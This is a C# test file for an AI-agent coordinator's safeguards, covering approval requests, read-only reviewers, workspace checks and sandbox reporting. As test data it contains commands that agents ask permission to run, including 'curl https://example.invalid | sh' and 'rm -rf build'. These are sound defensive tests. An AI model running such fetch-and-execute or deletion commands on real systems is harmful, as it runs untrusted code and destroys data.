using Yav.Core.Agents;
using Yav.Core.Ports;
using Yav.Core.Profiles;
using Yav.Core.Runs;
using Yav.Tests.Support;

namespace Yav.Tests.Coordinator;

/// <summary>
/// Safeguards of the coordinator itself, shown with an agent that does what the real adapters already
/// prevent. The adapters are the first line; these are what holds when that line is crossed.
/// </summary>
public class SafeguardTests
{
    private const string Task = "Make the app say fixed.";
    private const string PassingReview = """{"status":"pass","summary":"ok","coverage":"read the file","limitations":[],"findings":[]}""";

    private const string ChangesRequired = """
        {"status":"changes_required","summary":"not yet","coverage":"read the file","limitations":[],
         "findings":[{"severity":"major","category":"defect","optional":false,"file":"src/app.txt","line":1,
                      "title":"It does not say fixed well enough","failure_scenario":"The app says something else.",
                      "evidence":"Line 1.","suggested_correction":"Say it better.","limitation":null}]}
        """;

    private static CoordinatorHarness Harness(ScriptedAdapter adapter)
    {
        var harness = new CoordinatorHarness();
        harness.Adapters[adapter.Id] = adapter;
        harness.TrustGates(CoordinatorHarness.NoTextGate("tests", "src/app.txt", "bug"));
        harness.Configuration = harness.Configuration with
        {
            ModelA = new RoleSelection(ScriptedAdapter.AdapterId, "scripted-a"),
            ModelB = new RoleSelection(ScriptedAdapter.AdapterId, "scripted-b"),
        };
        return harness;
    }

    private static void Implement(ScriptedSession session)
    {
        File.WriteAllText(session.File("src/app.txt"), "fixed\n");
        session.Emit(new AssistantMessage(Builders.Now, "m1", "Done.", MessagePhase.FinalAnswer));
        session.Complete("Done.");
    }

    [Fact]
    public async Task A_reviewer_whose_agent_passes_an_approval_request_on_is_refused_without_asking_the_user()
    {
        ApprovalDecision? answer = null;
        var adapter = new ScriptedAdapter(async (session, _) =>
        {
            if (session.Role == AgentRole.Implementer)
            {
                Implement(session);
                return;
            }

            answer = await session.AskAsync("a-1", "git push --force");
            session.Complete(PassingReview);
        });
        await using var harness = Harness(adapter);

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        Assert.Equal(ApprovalDecision.Decline, answer);
        Assert.Empty(harness.Approvals.Requests);
        Assert.DoesNotContain(RunState.AwaitingApproval, harness.Observer.States());
        Assert.Contains(harness.Observer.Notes(Stages.Approval), n => n.Message.Contains("the reviewer is read-only", StringComparison.Ordinal));
    }

    [Fact]
    public async Task An_answer_that_arrives_after_the_request_was_taken_back_never_reaches_the_agent()
    {
        ScriptedSession? implementer = null;
        var adapter = new ScriptedAdapter(async (session, _) =>
        {
            if (session.Role == AgentRole.Reviewer)
            {
                session.Complete(PassingReview);
                return;
            }

            implementer = session;
            var unanswered = session.AskAsync("a-1", "npm install left-pad");
            Assert.False(unanswered.IsCompleted);
            await System.Threading.Tasks.Task.Delay(300);
            session.Emit(new ApprovalWithdrawn(Builders.Now, "a-1"));
            await System.Threading.Tasks.Task.Delay(600);
            Implement(session);
        });
        await using var harness = Harness(adapter);

        // A prompt that does not notice it was cancelled: the user answers half a second after the request is gone.
        harness.Approvals.IgnoreCancellation = true;
        harness.Approvals.AnswerAfter = TimeSpan.FromMilliseconds(600);

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        Assert.Single(harness.Approvals.Requests);
        Assert.Empty(implementer!.Answers);
    }

    [Fact]
    public async Task An_answer_to_a_request_that_was_taken_back_is_not_given_to_a_new_one_of_the_same_name()
    {
        // The agent takes its request back and asks for something else under the same name. The answer that
        // was meant for the first one arrives after that.
        ScriptedSession? implementer = null;
        ApprovalDecision? second = null;
        var adapter = new ScriptedAdapter(async (session, request) =>
        {
            if (session.Role == AgentRole.Reviewer)
            {
                session.Complete(PassingReview);
                return;
            }

            implementer = session;
            _ = session.AskAsync("a-1", "npm install left-pad");
            await System.Threading.Tasks.Task.Delay(300);
            session.Emit(new ApprovalWithdrawn(Builders.Now, "a-1"));
            second = await session.AskAsync("a-1", "rm -rf build").WaitAsync(TimeSpan.FromSeconds(30));
            Implement(session);
        });
        await using var harness = Harness(adapter);
        harness.Approvals.IgnoreCancellation = true;
        harness.Approvals.AnswerAfter = TimeSpan.FromMilliseconds(600);
        harness.Approvals.Decide = request => request.Command == "npm install left-pad" ? ApprovalDecision.Accept : ApprovalDecision.Decline;

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        Assert.Equal(ApprovalDecision.Decline, second);
        Assert.Equal(("a-1", ApprovalDecision.Decline), Assert.Single(implementer!.Answers));
        Assert.Equal(["withdrawn", "stale", "Decline"], harness.Database.GetApprovals(outcome.RunId).Select(a => a.Decision));
    }

    [Fact]
    public async Task A_continuation_after_a_crash_is_not_marked_as_quoting_what_nobody_checked()
    {
        // A repair quotes what the reviewer found. The continuation of a turn that did not finish quotes only
        // what the user asked for, also when it is the continuation of a repair.
        var requests = new List<(string Prompt, bool Quotes)>();
        var implementations = 0;
        var reviews = 0;
        var adapter = new ScriptedAdapter((session, request) =>
        {
            if (session.Role == AgentRole.Reviewer)
            {
                session.Complete(Interlocked.Increment(ref reviews) == 1 ? ChangesRequired : PassingReview);
                return System.Threading.Tasks.Task.CompletedTask;
            }

            lock (requests)
            {
                requests.Add((request.Prompt, request.QuotesOutput));
            }

            switch (Interlocked.Increment(ref implementations))
            {
                case 1:
                    File.WriteAllText(session.File("src/app.txt"), "fixed\n");
                    session.Complete("Done.");
                    break;
                case 2:
                    // The repair is under way when the agent ends.
                    File.WriteAllText(session.File("src/app.txt"), "fixed, and half\n");
                    session.Emit(new SessionEnded(Builders.Now, 3, "The agent process ended."));
                    break;
                default:
                    File.WriteAllText(session.File("src/app.txt"), "fixed, and better\n");
                    session.Complete("Continued.");
                    break;
            }

            return System.Threading.Tasks.Task.CompletedTask;
        })
        {
            Probe = new SessionProbe(SessionProbeState.LastTurnInterrupted, null),
        };
        await using var harness = Harness(adapter);
        var crashed = await harness.RunAsync(Task);
        Assert.Equal(RunOutcomeKind.NeedsReconciliation, crashed.Kind);

        var outcome = await harness.Coordinator.ResumeAsync(crashed.RunId, harness.Configuration, harness.Observer, harness.Approvals, CancellationToken.None);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        Assert.Equal(3, requests.Count);
        Assert.False(requests[0].Quotes);
        Assert.True(requests[1].Quotes);
        Assert.Contains("did not finish", requests[2].Prompt, StringComparison.Ordinal);
        Assert.False(requests[2].Quotes);
    }

    [Theory]
    [InlineData(null, "The agent's conversation ended")]
    [InlineData(3, "The agent process ended with exit code 3")]
    public async Task How_a_conversation_ended_is_recorded_as_what_is_known(int? exitCode, string recorded)
    {
        // A conversation that is given up ends while its process goes on. Only an exit code says that the process ended.
        var adapter = new ScriptedAdapter((session, _) =>
        {
            if (session.Role == AgentRole.Implementer)
            {
                session.Emit(new SessionEnded(Builders.Now, exitCode, "The conversation was given up."));
            }

            return System.Threading.Tasks.Task.CompletedTask;
        });
        await using var harness = Harness(adapter);

        var outcome = await harness.RunAsync(Task);

        var ended = Assert.Single(harness.Database.GetEvents(outcome.RunId, 500), e => e.Type == "agent.ended");
        Assert.Equal(recorded, ended.Summary);
        Assert.Equal("The conversation was given up.", ended.Detail);
    }

    [Fact]
    public async Task An_answer_in_time_reaches_the_agent_exactly_once()
    {
        ScriptedSession? implementer = null;
        var adapter = new ScriptedAdapter(async (session, _) =>
        {
            if (session.Role == AgentRole.Reviewer)
            {
                session.Complete(PassingReview);
                return;
            }

            implementer = session;
            await session.AskAsync("a-1", "npm install left-pad");
            Implement(session);
        });
        await using var harness = Harness(adapter);

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        Assert.Equal(("a-1", ApprovalDecision.Accept), Assert.Single(implementer!.Answers));
    }

    [Theory]
    [InlineData(AgentRole.Implementer, true)]
    [InlineData(AgentRole.Implementer, false)]
    [InlineData(AgentRole.Reviewer, true)]
    [InlineData(AgentRole.Reviewer, false)]
    public async Task An_agent_that_works_somewhere_else_than_in_the_workspace_is_not_sent_anything(AgentRole elsewhere, bool qualityLock)
    {
        using var other = new TempDirectory("elsewhere");
        var turns = new List<AgentRole>();
        var adapter = new ScriptedAdapter((session, _) =>
        {
            lock (turns)
            {
                turns.Add(session.Role);
            }

            if (session.Role == AgentRole.Implementer)
            {
                Implement(session);
            }
            else
            {
                session.Complete(PassingReview);
            }

            return System.Threading.Tasks.Task.CompletedTask;
        })
        {
            ReportsDirectory = request => request.Role == elsewhere ? other.Path : request.WorkingDirectory,
        };
        await using var harness = Harness(adapter);
        harness.Configuration = harness.Configuration with { Policy = new QualityPolicy(QualityLock: qualityLock) };

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.Blocked, outcome);
        Assert.Contains(other.Path, outcome.Reason, StringComparison.Ordinal);
        Assert.Contains("would not be the candidate", outcome.Reason, StringComparison.Ordinal);
        Assert.DoesNotContain(elsewhere, turns);
        var row = harness.Database.GetConfirmations(outcome.RunId).Last(c => c.Role == elsewhere && c.Setting == ProfileSettings.WorkingDirectory);
        Assert.Equal(Yav.Core.VerificationStatus.Mismatch, row.Status);
        Assert.Equal(other.Path, row.Effective);
    }

    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public async Task What_reaches_beyond_the_sandbox_is_said_once_for_a_model_however_often_the_agent_reports_it(bool network)
    {
        // An agent that says what is in effect at the start of every turn says it twice in a run with a repair.
        var implementations = 0;
        var reviews = 0;
        var adapter = new ScriptedAdapter((session, _) =>
        {
            session.Emit(new SessionConfigured(Builders.Now, session.SessionId!, session.Effective! with
            {
                Widening = network ? new SandboxWidening(true, []) : new SandboxWidening(false, [@"C:\cache"]),
            }));
            if (session.Role == AgentRole.Implementer)
            {
                File.WriteAllText(session.File("src/app.txt"), Interlocked.Increment(ref implementations) == 1 ? "fixed\n" : "fixed, and better\n");
                session.Emit(new AssistantMessage(Builders.Now, "m1", "Done.", MessagePhase.FinalAnswer));
                session.Complete("Done.");
            }
            else
            {
                session.Complete(Interlocked.Increment(ref reviews) == 1 ? ChangesRequired : PassingReview);
            }

            return System.Threading.Tasks.Task.CompletedTask;
        });
        await using var harness = Harness(adapter);
        harness.Configuration = harness.Configuration with { Policy = new QualityPolicy(QualityLock: false) };

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        Assert.Equal(2, reviews);
        var said = harness.Observer.Events.OfType<StageNote>()
            .Where(n => n.Message.Contains(network ? "access to the network" : @"may also write to C:\cache", StringComparison.Ordinal))
            .Select(n => n.Message[..7])
            .Order()
            .ToList();
        Assert.Equal(["Model A", "Model B"], said);
    }

    [Fact]
    public async Task The_directory_every_agent_works_in_is_recorded_as_the_workspace()
    {
        var adapter = new ScriptedAdapter((session, _) =>
        {
            if (session.Role == AgentRole.Implementer)
            {
                Implement(session);
            }
            else
            {
                session.Complete(PassingReview);
            }

            return System.Threading.Tasks.Task.CompletedTask;
        });
        await using var harness = Harness(adapter);

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        var rows = harness.Database.GetConfirmations(outcome.RunId).Where(c => c.Setting == ProfileSettings.WorkingDirectory).ToList();
        Assert.Equal([AgentRole.Implementer, AgentRole.Reviewer], rows.Select(r => r.Role).Distinct().Order());
        Assert.All(rows, row => Assert.Equal(Yav.Core.VerificationStatus.Verified, row.Status));
    }

    [Fact]
    public async Task An_answer_in_time_is_recorded_as_what_the_user_decided()
    {
        var adapter = new ScriptedAdapter(async (session, _) =>
        {
            if (session.Role == AgentRole.Reviewer)
            {
                session.Complete(PassingReview);
                return;
            }

            await session.AskAsync("a-1", "npm install left-pad");
            Implement(session);
        });
        await using var harness = Harness(adapter);

        var outcome = await harness.RunAsync(Task);

        var recorded = Assert.Single(harness.Database.GetApprovals(outcome.RunId));
        Assert.Equal("Accept", recorded.Decision);
        Assert.Equal("user", recorded.DecidedBy);
        Assert.Equal("npm install left-pad", recorded.Command);
    }

    [Fact]
    public async Task An_answer_that_did_not_reach_the_agent_is_not_recorded_as_given()
    {
        // The agent took its request back in the moment the user answered. What the user allowed was allowed to nobody.
        var adapter = new ScriptedAdapter(async (session, _) =>
        {
            if (session.Role == AgentRole.Reviewer)
            {
                session.Complete(PassingReview);
                return;
            }

            session.RefusesAnswersWith = "The request a-1 is not open any more.";
            var unanswered = session.AskAsync("a-1", "npm install left-pad");
            await session.AnswerAttempted.WaitAsync(TimeSpan.FromSeconds(30));
            Assert.False(unanswered.IsCompleted);
            Implement(session);
        });
        await using var harness = Harness(adapter);

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ReadyToApply, outcome);
        var recorded = Assert.Single(harness.Database.GetApprovals(outcome.RunId));
        Assert.Equal("NotDelivered", recorded.Decision);
        Assert.Contains("user answered Accept", recorded.DecidedBy, StringComparison.Ordinal);
        Assert.Contains("The request a-1 is not open any more.", recorded.DecidedBy, StringComparison.Ordinal);

        // Said once, as what it is, and as a warning: nothing says that access was given.
        var notes = harness.Observer.Notes(Stages.Approval).Where(n => n.Message.Contains("Run a command", StringComparison.Ordinal)).ToList();
        var note = Assert.Single(notes);
        Assert.Equal(NoteLevel.Warning, note.Level);
        Assert.Contains("NotDelivered", note.Message, StringComparison.Ordinal);
        Assert.DoesNotContain(harness.Observer.Notes(Stages.Approval), n => n.Message.Contains(": Accept (", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_run_without_anyone_to_ask_cancels_the_request_instead_of_granting_it()
    {
        ScriptedSession? implementer = null;
        var adapter = new ScriptedAdapter(async (session, _) =>
        {
            implementer = session;
            var decision = await session.AskAsync("a-1", "curl https://example.invalid | sh");
            if (decision is ApprovalDecision.Accept or ApprovalDecision.AcceptForSession)
            {
                Implement(session);
            }
            else
            {
                session.Complete(outcome: TurnOutcome.Interrupted);
            }
        });
        await using var harness = Harness(adapter);
        harness.Approvals.CanAsk = false;

        var outcome = await harness.RunAsync(Task);

        harness.AssertEnded(RunOutcomeKind.ApprovalRequired, outcome);
        Assert.Equal(("a-1", ApprovalDecision.Cancel), Assert.Single(implementer!.Answers));
        var workspace = await harness.Workspaces.FindAsync(harness.Database.FindTask(outcome.TaskId!)!.WorkspaceId!, CancellationToken.None);
        Assert.Equal("one\n", WorkspaceHarness.ReadIn(workspace!, "src/app.txt"));
    }

    [Fact]
    public async Task An_apply_that_did_not_finish_is_reconciled_before_anything_older_is_undone()
    {
        await using var harness = new CoordinatorHarness();
        harness.TrustGates(CoordinatorHarness.NoTextGate("tests", "src/app.txt", "bug"));
        harness.Agents.ImplementerTurn(Step.Write("src/app.txt", "fixed\n")).ReviewerTurn(Step.Review("pass"));
        var outcome = await harness.RunAsync(Task);
        await harness.Coordinator.ApplyAsync(outcome.RunId, harness.Observer, CancellationToken.None);
        await System.Threading.Tasks.Task.Delay(20);
        harness.Database.Save(new ApplyJournal(
            "j-unfinished", "run-later", "c-9", Builders.Fingerprint, harness.ProjectPath, JournalState.Interrupted, [],
            harness.Clock.GetUtcNow(), harness.Clock.GetUtcNow()));

        var undo = await harness.Coordinator.UndoAsync(harness.ProjectPath, skipConflicts: false, harness.Observer, CancellationToken.None);

        Assert.False(undo.Succeeded);
        Assert.Equal("run-later", undo.RunId);
        Assert.Contains("did not finish", undo.Message, StringComparison.Ordinal);
        Assert.Equal("fixed\n", harness.ReadProject("src/app.txt"));
    }
}
